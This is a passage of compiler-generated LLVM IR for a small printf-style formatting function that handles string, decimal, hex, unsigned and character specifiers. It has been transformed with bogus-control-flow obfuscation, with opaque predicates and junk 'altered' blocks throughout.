  store i8* %91, i8** %13, align 8
  store i32 1, i32* %16, align 4
  br label %92

; <label>:92:                                     ; preds = %89, %84
  br label %93

; <label>:93:                                     ; preds = %98, %92
  %94 = load i8*, i8** %13, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 48
  br i1 %97, label %98, label %103

; <label>:98:                                     ; preds = %93
  %99 = load i8*, i8** %13, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %13, align 8
  %101 = load i32, i32* %16, align 4
  %102 = or i32 %101, 2
  store i32 %102, i32* %16, align 4
  br label %93

; <label>:103:                                    ; preds = %93
  br label %104

; <label>:104:                                    ; preds = %141, %103
  %105 = load i8*, i8** %13, align 8
  %106 = load i8, i8* %105, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp sge i32 %107, 48
  br i1 %108, label %109, label %114

; <label>:109:                                    ; preds = %104
  %110 = load i8*, i8** %13, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp sle i32 %112, 57
  br label %114

; <label>:114:                                    ; preds = %109, %104
  %115 = phi i1 [ false, %104 ], [ %113, %109 ]
  br i1 %115, label %116, label %144

; <label>:116:                                    ; preds = %114
  %117 = load i32, i32* @x.7
  %118 = load i32, i32* @y.8
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %116
  %125 = load i32, i32* %15, align 4
  %126 = mul nsw i32 %125, 10
  store i32 %126, i32* %15, align 4
  %127 = load i8*, i8** %13, align 8
  %128 = load i8, i8* %127, align 1
  %129 = zext i8 %128 to i32
  %130 = sub nsw i32 %129, 48
  %131 = load i32, i32* %15, align 4
  %132 = add nsw i32 %131, %130
  store i32 %132, i32* %15, align 4
  %133 = load i32, i32* @x.7
  %134 = load i32, i32* @y.8
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart231, label %originalBB10alteredBB

originalBBpart231:                                ; preds = %originalBB10
  br label %141

; <label>:141:                                    ; preds = %originalBBpart231
  %142 = load i8*, i8** %13, align 8
  %143 = getelementptr inbounds i8, i8* %142, i32 1
  store i8* %143, i8** %13, align 8
  br label %104

; <label>:144:                                    ; preds = %114
  %145 = load i8*, i8** %13, align 8
  %146 = load i8, i8* %145, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 115
  br i1 %148, label %149, label %199

; <label>:149:                                    ; preds = %144
  %150 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %151 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 8
  %153 = icmp ule i32 %152, 40
  br i1 %153, label %154, label %160

; <label>:154:                                    ; preds = %149
  %155 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 3
  %156 = load i8*, i8** %155, align 8
  %157 = getelementptr i8, i8* %156, i32 %152
  %158 = bitcast i8* %157 to i32*
  %159 = add i32 %152, 8
  store i32 %159, i32* %151, align 8
  br label %181

; <label>:160:                                    ; preds = %149
  %161 = load i32, i32* @x.7
  %162 = load i32, i32* @y.8
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %160
  %169 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 2
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to i32*
  %172 = getelementptr i8, i8* %170, i32 8
  store i8* %172, i8** %169, align 8
  %173 = load i32, i32* @x.7
  %174 = load i32, i32* @y.8
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %181

; <label>:181:                                    ; preds = %originalBBpart235, %154
  %182 = phi i32* [ %158, %154 ], [ %171, %originalBBpart235 ]
  %183 = load i32, i32* %182, align 4
  %184 = sext i32 %183 to i64
  %185 = inttoptr i64 %184 to i8*
  store i8* %185, i8** %19, align 8
  %186 = load i8**, i8*** %12, align 8
  %187 = load i8*, i8** %19, align 8
  %188 = icmp ne i8* %187, null
  br i1 %188, label %189, label %191

; <label>:189:                                    ; preds = %181
  %190 = load i8*, i8** %19, align 8
  br label %192

; <label>:191:                                    ; preds = %181
  br label %192

; <label>:192:                                    ; preds = %191, %189
  %193 = phi i8* [ %190, %189 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.492, i32 0, i32 0), %191 ]
  %194 = load i32, i32* %15, align 4
  %195 = load i32, i32* %16, align 4
  %196 = call i32 @prints(i8** %186, i8* %193, i32 %194, i32 %195)
  %197 = load i32, i32* %17, align 4
  %198 = add nsw i32 %197, %196
  store i32 %198, i32* %17, align 4
  br label %523

; <label>:199:                                    ; preds = %144
  %200 = load i32, i32* @x.7
  %201 = load i32, i32* @y.8
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %199
  %208 = load i8*, i8** %13, align 8
  %209 = load i8, i8* %208, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp eq i32 %210, 100
  %212 = load i32, i32* @x.7
  %213 = load i32, i32* @y.8
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %211, label %220, label %245

; <label>:220:                                    ; preds = %originalBBpart239
  %221 = load i8**, i8*** %12, align 8
  %222 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %223 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 8
  %225 = icmp ule i32 %224, 40
  br i1 %225, label %226, label %232

; <label>:226:                                    ; preds = %220
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %222, i32 0, i32 3
  %228 = load i8*, i8** %227, align 8
  %229 = getelementptr i8, i8* %228, i32 %224
  %230 = bitcast i8* %229 to i32*
  %231 = add i32 %224, 8
  store i32 %231, i32* %223, align 8
  br label %237

; <label>:232:                                    ; preds = %220
  %233 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %222, i32 0, i32 2
  %234 = load i8*, i8** %233, align 8
  %235 = bitcast i8* %234 to i32*
  %236 = getelementptr i8, i8* %234, i32 8
  store i8* %236, i8** %233, align 8
  br label %237

; <label>:237:                                    ; preds = %232, %226
  %238 = phi i32* [ %230, %226 ], [ %235, %232 ]
  %239 = load i32, i32* %238, align 4
  %240 = load i32, i32* %15, align 4
  %241 = load i32, i32* %16, align 4
  %242 = call i32 @printi(i8** %221, i32 %239, i32 10, i32 1, i32 %240, i32 %241, i32 97)
  %243 = load i32, i32* %17, align 4
  %244 = add nsw i32 %243, %242
  store i32 %244, i32* %17, align 4
  br label %523

; <label>:245:                                    ; preds = %originalBBpart239
  %246 = load i8*, i8** %13, align 8
  %247 = load i8, i8* %246, align 1
  %248 = zext i8 %247 to i32
  %249 = icmp eq i32 %248, 120
  br i1 %249, label %250, label %291

; <label>:250:                                    ; preds = %245
  %251 = load i32, i32* @x.7
  %252 = load i32, i32* @y.8
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %250
  %259 = load i8**, i8*** %12, align 8
  %260 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %261 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 0
  %262 = load i32, i32* %261, align 8
  %263 = icmp ule i32 %262, 40
  %264 = load i32, i32* @x.7
  %265 = load i32, i32* @y.8
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %263, label %272, label %278

; <label>:272:                                    ; preds = %originalBBpart243
  %273 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 3
  %274 = load i8*, i8** %273, align 8
  %275 = getelementptr i8, i8* %274, i32 %262
  %276 = bitcast i8* %275 to i32*
  %277 = add i32 %262, 8
  store i32 %277, i32* %261, align 8
  br label %283

; <label>:278:                                    ; preds = %originalBBpart243
  %279 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %260, i32 0, i32 2
  %280 = load i8*, i8** %279, align 8
  %281 = bitcast i8* %280 to i32*
  %282 = getelementptr i8, i8* %280, i32 8
  store i8* %282, i8** %279, align 8
  br label %283

; <label>:283:                                    ; preds = %278, %272
  %284 = phi i32* [ %276, %272 ], [ %281, %278 ]
  %285 = load i32, i32* %284, align 4
  %286 = load i32, i32* %15, align 4
  %287 = load i32, i32* %16, align 4
  %288 = call i32 @printi(i8** %259, i32 %285, i32 16, i32 0, i32 %286, i32 %287, i32 97)
  %289 = load i32, i32* %17, align 4
  %290 = add nsw i32 %289, %288
  store i32 %290, i32* %17, align 4
  br label %523

; <label>:291:                                    ; preds = %245
  %292 = load i8*, i8** %13, align 8
  %293 = load i8, i8* %292, align 1
  %294 = zext i8 %293 to i32
  %295 = icmp eq i32 %294, 88
  br i1 %295, label %296, label %353

; <label>:296:                                    ; preds = %291
  %297 = load i8**, i8*** %12, align 8
  %298 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %299 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %298, i32 0, i32 0
  %300 = load i32, i32* %299, align 8
  %301 = icmp ule i32 %300, 40
  br i1 %301, label %302, label %324

; <label>:302:                                    ; preds = %296
  %303 = load i32, i32* @x.7
  %304 = load i32, i32* @y.8
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %302
  %311 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %298, i32 0, i32 3
  %312 = load i8*, i8** %311, align 8
  %313 = getelementptr i8, i8* %312, i32 %300
  %314 = bitcast i8* %313 to i32*
  %315 = add i32 %300, 8
  store i32 %315, i32* %299, align 8
  %316 = load i32, i32* @x.7
  %317 = load i32, i32* @y.8
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBBpart254, label %originalBB45alteredBB

originalBBpart254:                                ; preds = %originalBB45
  br label %329

; <label>:324:                                    ; preds = %296
  %325 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %298, i32 0, i32 2
  %326 = load i8*, i8** %325, align 8
  %327 = bitcast i8* %326 to i32*
  %328 = getelementptr i8, i8* %326, i32 8
  store i8* %328, i8** %325, align 8
  br label %329

; <label>:329:                                    ; preds = %324, %originalBBpart254
  %330 = phi i32* [ %314, %originalBBpart254 ], [ %327, %324 ]
  %331 = load i32, i32* @x.7
  %332 = load i32, i32* @y.8
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %329
  %339 = load i32, i32* %330, align 4
  %340 = load i32, i32* %15, align 4
  %341 = load i32, i32* %16, align 4
  %342 = call i32 @printi(i8** %297, i32 %339, i32 16, i32 0, i32 %340, i32 %341, i32 65)
  %343 = load i32, i32* %17, align 4
  %344 = add nsw i32 %343, %342
  store i32 %344, i32* %17, align 4
  %345 = load i32, i32* @x.7
  %346 = load i32, i32* @y.8
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBBpart265, label %originalBB56alteredBB

originalBBpart265:                                ; preds = %originalBB56
  br label %523

; <label>:353:                                    ; preds = %291
  %354 = load i32, i32* @x.7
  %355 = load i32, i32* @y.8
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %353
  %362 = load i8*, i8** %13, align 8
  %363 = load i8, i8* %362, align 1
  %364 = zext i8 %363 to i32
  %365 = icmp eq i32 %364, 117
  %366 = load i32, i32* @x.7
  %367 = load i32, i32* @y.8
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %365, label %374, label %463

; <label>:374:                                    ; preds = %originalBBpart269
  %375 = load i32, i32* @x.7
  %376 = load i32, i32* @y.8
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %374
  %383 = load i8**, i8*** %12, align 8
  %384 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %385 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %384, i32 0, i32 0
  %386 = load i32, i32* %385, align 8
  %387 = icmp ule i32 %386, 40
  %388 = load i32, i32* @x.7
  %389 = load i32, i32* @y.8
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %387, label %396, label %418

; <label>:396:                                    ; preds = %originalBBpart273
  %397 = load i32, i32* @x.7
  %398 = load i32, i32* @y.8
  %399 = sub i32 %397, 1
  %400 = mul i32 %397, %399
  %401 = urem i32 %400, 2
  %402 = icmp eq i32 %401, 0
  %403 = icmp slt i32 %398, 10
  %404 = or i1 %402, %403
  br i1 %404, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %396
  %405 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %384, i32 0, i32 3
  %406 = load i8*, i8** %405, align 8
  %407 = getelementptr i8, i8* %406, i32 %386
  %408 = bitcast i8* %407 to i32*
  %409 = add i32 %386, 8
  store i32 %409, i32* %385, align 8
  %410 = load i32, i32* @x.7
  %411 = load i32, i32* @y.8
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBBpart283, label %originalBB75alteredBB

originalBBpart283:                                ; preds = %originalBB75
  br label %439

; <label>:418:                                    ; preds = %originalBBpart273
  %419 = load i32, i32* @x.7
  %420 = load i32, i32* @y.8
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %418
  %427 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %384, i32 0, i32 2
  %428 = load i8*, i8** %427, align 8
  %429 = bitcast i8* %428 to i32*
  %430 = getelementptr i8, i8* %428, i32 8
  store i8* %430, i8** %427, align 8
  %431 = load i32, i32* @x.7
  %432 = load i32, i32* @y.8
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %439

; <label>:439:                                    ; preds = %originalBBpart287, %originalBBpart283
  %440 = phi i32* [ %408, %originalBBpart283 ], [ %429, %originalBBpart287 ]
  %441 = load i32, i32* @x.7
  %442 = load i32, i32* @y.8
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %439
  %449 = load i32, i32* %440, align 4
  %450 = load i32, i32* %15, align 4
  %451 = load i32, i32* %16, align 4
  %452 = call i32 @printi(i8** %383, i32 %449, i32 10, i32 0, i32 %450, i32 %451, i32 97)
  %453 = load i32, i32* %17, align 4
  %454 = add nsw i32 %453, %452
  store i32 %454, i32* %17, align 4
  %455 = load i32, i32* @x.7
  %456 = load i32, i32* @y.8
  %457 = sub i32 %455, 1
  %458 = mul i32 %455, %457
  %459 = urem i32 %458, 2
  %460 = icmp eq i32 %459, 0
  %461 = icmp slt i32 %456, 10
  %462 = or i1 %460, %461
  br i1 %462, label %originalBBpart297, label %originalBB89alteredBB

originalBBpart297:                                ; preds = %originalBB89
  br label %523

; <label>:463:                                    ; preds = %originalBBpart269
  %464 = load i8*, i8** %13, align 8
  %465 = load i8, i8* %464, align 1
  %466 = zext i8 %465 to i32
  %467 = icmp eq i32 %466, 99
  br i1 %467, label %468, label %497

; <label>:468:                                    ; preds = %463
  %469 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %470 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %469, i32 0, i32 0
  %471 = load i32, i32* %470, align 8
  %472 = icmp ule i32 %471, 40
  br i1 %472, label %473, label %479

; <label>:473:                                    ; preds = %468
  %474 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %469, i32 0, i32 3
  %475 = load i8*, i8** %474, align 8
  %476 = getelementptr i8, i8* %475, i32 %471
  %477 = bitcast i8* %476 to i32*
  %478 = add i32 %471, 8
  store i32 %478, i32* %470, align 8
  br label %484

; <label>:479:                                    ; preds = %468
  %480 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %469, i32 0, i32 2
  %481 = load i8*, i8** %480, align 8
  %482 = bitcast i8* %481 to i32*
  %483 = getelementptr i8, i8* %481, i32 8
  store i8* %483, i8** %480, align 8
  br label %484

; <label>:484:                                    ; preds = %479, %473
  %485 = phi i32* [ %477, %473 ], [ %482, %479 ]
  %486 = load i32, i32* %485, align 4
  %487 = trunc i32 %486 to i8
  %488 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 0
  store i8 %487, i8* %488, align 1
  %489 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 1
  store i8 0, i8* %489, align 1
  %490 = load i8**, i8*** %12, align 8
  %491 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i32 0, i32 0
  %492 = load i32, i32* %15, align 4
  %493 = load i32, i32* %16, align 4
  %494 = call i32 @prints(i8** %490, i8* %491, i32 %492, i32 %493)
  %495 = load i32, i32* %17, align 4
  %496 = add nsw i32 %495, %494
  store i32 %496, i32* %17, align 4
  br label %523

; <label>:497:                                    ; preds = %463
  br label %522

; <label>:498:                                    ; preds = %33
  br label %499

; <label>:499:                                    ; preds = %498, %83
  %500 = load i32, i32* @x.7
  %501 = load i32, i32* @y.8
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %499
  %508 = load i8**, i8*** %12, align 8
  %509 = load i8*, i8** %13, align 8
  %510 = load i8, i8* %509, align 1
  %511 = zext i8 %510 to i32
  call void @printchar(i8** %508, i32 %511)
  %512 = load i32, i32* %17, align 4
  %513 = add nsw i32 %512, 1
  store i32 %513, i32* %17, align 4
  %514 = load i32, i32* @x.7
  %515 = load i32, i32* @y.8
  %516 = sub i32 %514, 1
  %517 = mul i32 %514, %516
  %518 = urem i32 %517, 2
  %519 = icmp eq i32 %518, 0
  %520 = icmp slt i32 %515, 10
  %521 = or i1 %519, %520
  br i1 %521, label %originalBBpart2108, label %originalBB99alteredBB

originalBBpart2108:                               ; preds = %originalBB99
  br label %522

; <label>:522:                                    ; preds = %originalBBpart2108, %497
  br label %523

; <label>:523:                                    ; preds = %522, %484, %originalBBpart297, %originalBBpart265, %283, %237, %192
  %524 = load i32, i32* @x.7
  %525 = load i32, i32* @y.8
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %523
  %532 = load i8*, i8** %13, align 8
  %533 = getelementptr inbounds i8, i8* %532, i32 1
  store i8* %533, i8** %13, align 8
  %534 = load i32, i32* @x.7
  %535 = load i32, i32* @y.8
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %28

; <label>:542:                                    ; preds = %originalBBpart24, %28
  %543 = load i8**, i8*** %12, align 8
  %544 = icmp ne i8** %543, null
  br i1 %544, label %545, label %548

; <label>:545:                                    ; preds = %542
  %546 = load i8**, i8*** %12, align 8
  %547 = load i8*, i8** %546, align 8
  store i8 0, i8* %547, align 1
  br label %548

; <label>:548:                                    ; preds = %545, %542
  %549 = load i32, i32* @x.7
  %550 = load i32, i32* @y.8
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %548
  %557 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %558 = bitcast %struct.__va_list_tag* %557 to i8*
  call void @llvm.va_end(i8* %558)
  %559 = load i32, i32* %17, align 4
  %560 = load i32, i32* @x.7
  %561 = load i32, i32* @y.8
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  ret i32 %559

originalBBalteredBB:                              ; preds = %originalBB, %3
  %568 = alloca i8**, align 8
  %569 = alloca i8*, align 8
  %570 = alloca %struct.__va_list_tag*, align 8
  %571 = alloca i32, align 4
  %572 = alloca i32, align 4
  %573 = alloca i32, align 4
  %574 = alloca [2 x i8], align 1
  %575 = alloca i8*, align 8
  store i8** %0, i8*** %568, align 8
  store i8* %1, i8** %569, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %570, align 8
  store i32 0, i32* %573, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  %576 = load i8*, i8** %13, align 8
  %577 = load i8, i8* %576, align 1
  %578 = zext i8 %577 to i32
  %579 = icmp eq i32 %578, 37
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %116
  %580 = load i32, i32* %15, align 4
  %_ = sub i32 %580, 10
  %gen = mul i32 %_, 10
  %_11 = sub i32 0, %580
  %gen12 = add i32 %_11, 10
  %581 = mul nsw i32 %580, 10
  store i32 %581, i32* %15, align 4
  %582 = load i8*, i8** %13, align 8
  %583 = load i8, i8* %582, align 1
  %584 = zext i8 %583 to i32
  %_13 = sub i32 %584, 48
  %gen14 = mul i32 %_13, 48
  %_15 = shl i32 %584, 48
  %585 = sub nsw i32 %584, 48
  %586 = load i32, i32* %15, align 4
  %_16 = sub i32 0, %586
  %gen17 = add i32 %_16, %585
  %_18 = shl i32 %586, %585
  %_19 = sub i32 0, %586
  %gen20 = add i32 %_19, %585
  %_21 = sub i32 0, %586
  %gen22 = add i32 %_21, %585
  %_23 = sub i32 %586, %585
  %gen24 = mul i32 %_23, %585
  %_25 = sub i32 0, %586
  %gen26 = add i32 %_25, %585
  %_27 = sub i32 0, %586
  %gen28 = add i32 %_27, %585
  %_29 = shl i32 %586, %585
  %587 = add nsw i32 %586, %585
  store i32 %587, i32* %15, align 4
  br label %originalBB10

originalBB33alteredBB:                            ; preds = %originalBB33, %160
  %588 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 2
  %589 = load i8*, i8** %588, align 8
  %590 = bitcast i8* %589 to i32*
  %591 = getelementptr i8, i8* %589, i32 8
  store i8* %591, i8** %588, align 8
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %199
  %592 = load i8*, i8** %13, align 8
  %593 = load i8, i8* %592, align 1
  %594 = zext i8 %593 to i32
  %595 = icmp eq i32 %594, 100
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %250
  %596 = load i8**, i8*** %12, align 8
  %597 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %598 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %597, i32 0, i32 0
  %599 = load i32, i32* %598, align 8
  %600 = icmp ule i32 %599, 40
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %302
  %601 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %298, i32 0, i32 3
  %602 = load i8*, i8** %601, align 8
  %603 = getelementptr i8, i8* %602, i32 %300
  %604 = bitcast i8* %603 to i32*
  %_46 = shl i32 %300, 8
  %_47 = sub i32 0, %300
  %gen48 = add i32 %_47, 8
  %_49 = sub i32 0, %300
  %gen50 = add i32 %_49, 8
  %_51 = sub i32 %300, 8
  %gen52 = mul i32 %_51, 8
  %605 = add i32 %300, 8
  store i32 %605, i32* %299, align 8
  br label %originalBB45

originalBB56alteredBB:                            ; preds = %originalBB56, %329
  %606 = load i32, i32* %330, align 4
  %607 = load i32, i32* %15, align 4
  %608 = load i32, i32* %16, align 4
  %609 = call i32 @printi(i8** %297, i32 %606, i32 16, i32 0, i32 %607, i32 %608, i32 65)
  %610 = load i32, i32* %17, align 4
  %_57 = shl i32 %610, %609
  %_58 = shl i32 %610, %609
  %_59 = sub i32 %610, %609
  %gen60 = mul i32 %_59, %609
  %_61 = shl i32 %610, %609
  %_62 = shl i32 %610, %609
  %_63 = shl i32 %610, %609
  %611 = add nsw i32 %610, %609
  store i32 %611, i32* %17, align 4
  br label %originalBB56

originalBB67alteredBB:                            ; preds = %originalBB67, %353
  %612 = load i8*, i8** %13, align 8
  %613 = load i8, i8* %612, align 1
  %614 = zext i8 %613 to i32
  %615 = icmp eq i32 %614, 117
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %374
  %616 = load i8**, i8*** %12, align 8
  %617 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %618 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %617, i32 0, i32 0
  %619 = load i32, i32* %618, align 8
  %620 = icmp ule i32 %619, 40
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %396
